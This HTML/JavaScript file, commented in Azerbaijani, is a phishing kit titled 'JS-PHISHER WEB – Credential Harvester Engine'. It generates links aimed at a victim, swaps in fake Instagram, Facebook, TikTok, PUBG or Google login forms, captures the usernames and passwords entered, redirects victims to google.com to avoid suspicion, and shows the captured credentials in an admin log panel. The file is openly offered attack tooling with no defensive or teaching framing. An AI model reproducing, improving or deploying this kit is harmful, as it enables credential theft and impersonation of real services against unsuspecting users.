<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Analizer - V.K PhishGen</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');

        :root {
            --bg: #0d0d12;
            --card: #16161e;
            --primary: #ff3e3e;
            --accent: #00d9ff;
            --text: #e4e4e4;
        }

        body {
            margin: 0; background: var(--bg); color: var(--text);
            font-family: 'JetBrains Mono', monospace;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }

        .container {
            width: 90%; max-width: 600px; background: var(--card);
            border: 1px solid #2a2a35; border-radius: 20px; padding: 30px;
            box-shadow: 0 15px 50px rgba(0,0,0,0.5);
        }

        .header { text-align: center; border-bottom: 1px solid #2a2a35; padding-bottom: 20px; margin-bottom: 20px; }
        .header h1 { color: var(--primary); margin: 0; letter-spacing: 3px; font-size: 24px; }
        .header p { font-size: 10px; opacity: 0.6; margin-top: 5px; }

        .section-title { font-size: 14px; color: var(--accent); margin-bottom: 15px; display: block; }

        select, input {
            width: 100%; padding: 14px; margin-bottom: 15px;
            background: #09090d; border: 1px solid #333; border-radius: 10px;
            color: #fff; outline: none; font-family: inherit;
        }

        .btn {
            width: 100%; padding: 15px; background: var(--primary);
            color: #fff; border: none; border-radius: 10px;
            font-weight: bold; cursor: pointer; transition: 0.3s;
            text-transform: uppercase;
        }

        .btn:hover { background: #d32f2f; box-shadow: 0 0 20px rgba(255, 62, 62, 0.3); }

        #linkDisplay {
            margin-top: 20px; padding: 15px; background: #000;
            border: 1px dashed var(--accent); border-radius: 10px;
            display: none; word-break: break-all; color: var(--accent); font-size: 12px;
        }

        .logs-area {
            margin-top: 30px; max-height: 200px; overflow-y: auto;
            border-top: 1px solid #2a2a35; padding-top: 20px;
        }

        .log-item {
            background: #09090d; padding: 10px; border-radius: 8px;
            margin-bottom: 10px; border-left: 3px solid var(--primary);
            font-size: 12px;
        }

        .log-item b { color: var(--accent); }
    </style>
</head>
<body>

    <div class="container" id="adminPanel">
        <div class="header">
            <h1>JS-PHISHER WEB</h1>
            <p>V.K PROJECT - CREDENTIAL HARVESTER ENGINE</p>
        </div>

        <span class="section-title">> Səhifəni Hazırla</span>
        <select id="targetSite">
            <option value="Instagram">Instagram</option>
            <option value="Facebook">Facebook</option>
            <option value="TikTok">TikTok</option>
            <option value="PUBG">PUBG Mobile (Gift)</option>
            <option value="Gmail">Google Account</option>
        </select>

        <input type="text" id="customSlug" placeholder="Link sonluğu (məs: pulsuz-uc-qazan)">
        
        <button class="btn" onclick="createLink()">LİNKİ GENERASİYA ET</button>

        <div id="linkDisplay">
            <small>Qurbana göndər:</small><br>
            <span id="generatedUrl"></span>
        </div>

        <div class="logs-area">
            <span class="section-title">> Tutulan Məlumatlar</span>
            <div id="logList">
                <p style="opacity: 0.3; font-size: 11px; text-align: center;">Hələ ki, məlumat yoxdur...</p>
            </div>
        </div>
    </div>

    <script>
        // 1. Link Yaradılması
        function createLink() {
            const site = document.getElementById('targetSite').value;
            const slug = document.getElementById('customSlug').value || 'login';
            const display = document.getElementById('linkDisplay');
            const urlSpan = document.getElementById('generatedUrl');

            // Mövcud URL-ə parametrlər əlavə edirik
            const finalLink = window.location.href.split('?')[0] + `?view=${site}&ref=${slug}`;
            
            urlSpan.innerText = finalLink;
            display.style.display = 'block';
        }

        // 2. Qurban Görünüşü (Giriş Səhifəsi)
        function checkMode() {
            const params = new URLSearchParams(window.location.search);
            const view = params.get('view');

            if (view) {
                // Əgər linkə qurban giribsə, bütün ekranı dəyiş
                document.body.innerHTML = `
                    <div style="background:#fafafa; color:#262626; height:100vh; width:100%; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family: sans-serif;">
                        <div style="background:#fff; border:1px solid #dbdbdb; padding:40px; width:350px; text-align:center;">
                            <h2 style="font-style: italic; font-size: 32px; margin-bottom:20px;">${view}</h2>
                            <form onsubmit="captureData(event, '${view}')">
                                <input type="text" id="email" placeholder="Telefon, istifadəçi adı və ya email" style="width:100%; padding:10px; margin-bottom:8px; border:1px solid #dbdbdb; border-radius:3px; background:#fafafa;" required>
                                <input type="password" id="pass" placeholder="Şifrə" style="width:100%; padding:10px; margin-bottom:12px; border:1px solid #dbdbdb; border-radius:3px; background:#fafafa;" required>
                                <button type="submit" style="width:100%; background:#0095f6; color:#fff; border:none; padding:8px; border-radius:4px; font-weight:bold; cursor:pointer;">Daxil ol</button>
                            </form>
                        </div>
                    </div>
                `;
            }
        }

        // 3. Məlumatın Tutulması
        function captureData(e, site) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            const data = {
                site: site,
                user: email,
                pass: pass,
                time: new Date().toLocaleTimeString()
            };

            // Məlumatı brauzer yaddaşına atırıq
            let logs = JSON.parse(localStorage.getItem('phish_logs') || "[]");
            logs.push(data);
            localStorage.setItem('phish_logs', JSON.stringify(logs));

            // Qurbanı aldatmaq üçün yönləndirmə
            window.location.href = "https://www.google.com";
        }

        // 4. Admin Panelində Loqları Yeniləmə
        function refreshLogs() {
            const list = document.getElementById('logList');
            if(!list) return;

            let logs = JSON.parse(localStorage.getItem('phish_logs') || "[]");
            
            if (logs.length > 0) {
                list.innerHTML = logs.reverse().map(item => `
                    <div class="log-item">
                        <b>[${item.site}]</b> User: ${item.user} <br>
                        <span style="color:#ff3e3e">Pass: ${item.pass}</span> 
                        <div style="font-size:9px; opacity:0.5; text-align:right;">${item.time}</div>
                    </div>
                `).join('');
            }
        }

        // Başlat
        checkMode();
        setInterval(refreshLogs, 2000);
    </script>
</body>
</html>
